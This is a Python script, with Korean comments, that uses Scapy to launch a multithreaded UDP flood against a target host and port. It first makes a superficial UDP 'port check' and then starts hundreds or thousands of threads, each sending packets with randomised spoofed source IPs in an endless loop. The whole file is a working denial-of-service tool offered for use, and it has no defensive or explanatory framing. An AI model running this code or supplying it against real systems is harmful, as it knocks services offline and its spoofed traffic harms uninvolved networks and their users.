from scapy.all import *
from threading import Thread
from datetime import datetime
import argparse
import socket
import subprocess
import sys
import random
import string
import time
import os  # 운영체제 확인을 위해 os 모듈 import

def clear_screen():
    if os.name == 'nt':  # Windows의 경우
        subprocess.call('cls', shell=True)
    else:  # Unix/Linux/Mac의 경우
        subprocess.call('clear', shell=True)

def scan(dst_ip, dst_port):
    clear_screen()
    t1 = datetime.now()
    try:
        remoteIP = socket.gethostbyname(dst_ip)
    except socket.gaierror:
        print('Hostname could not be resolved. Exiting')
        sys.exit()

    print("-" * 60)
    print("Please wait, scanning remote host", remoteIP)
    print("-" * 60)
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        result = sock.connect_ex((remoteIP, dst_port))
        if result == 0:
            print("Port {}: Open".format(dst_port))
            return True
        else:
            return False
    except KeyboardInterrupt:
        print("You pressed Ctrl+C")
        sys.exit()
    except socket.error:
        print("Couldn't connect to server")
        sys.exit()
    finally:
        sock.close()

    t2 = datetime.now()
    total = t2 - t1
    print("Scanning Completed in: ", total)

class udp_flood(Thread):
    def __init__(self, dst_IP, dst_port):
        Thread.__init__(self)
        self.dst_IP = dst_IP
        self.dst_port = dst_port
        self.running = True
        self.intercount = 0

        self.data = string.ascii_letters + string.digits

    def run(self):
        while self.running:
            self.udpf = IP(src=RandIP(), dst=self.dst_IP) / UDP(sport=RandShort(), dport=self.dst_port) / (self.data)
            send(self.udpf)
            print("Packet Sent : " + str(self.intercount))
            self.intercount += 1

def arg_usage():
    print("-" * 60)
    print("./udp_flooding.py")
    print("-i|--target IP <Hostname|IP>")
    print("-p|--target PORT, Please UDP Service Port Enter")
    print("-t|--thread <Number of Multi Run threads> Defaults to 256")
    print("-h|--help Shows \n")
    print("Ex, python3 udp_flooding.py -i 192.168.1.100 -p 80 -t 10000 \n")
    print("-" * 60)
    sys.exit()

def parse():
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', type=str, help='--target IP <Hostname|IP>', required=True)
    parser.add_argument('-p', type=int, help="--target PORT", required=True)
    parser.add_argument('-t', type=int, help="--threads <Number of Multi Run threads> Defaults to 256", default=256)
    args = parser.parse_args()
    if not args.i or not args.p:
        arg_usage()
    return args

def main(dst_ip, port, threads):
    port_check = scan(dst_ip, port)
    if port_check:
        for _ in range(threads):
            udp = udp_flood(dst_ip, port)
            udp.start()
    else:
        print("Port Not Open...")

if __name__ == '__main__':
    args = parse()
    main(args.i, args.p, args.t)
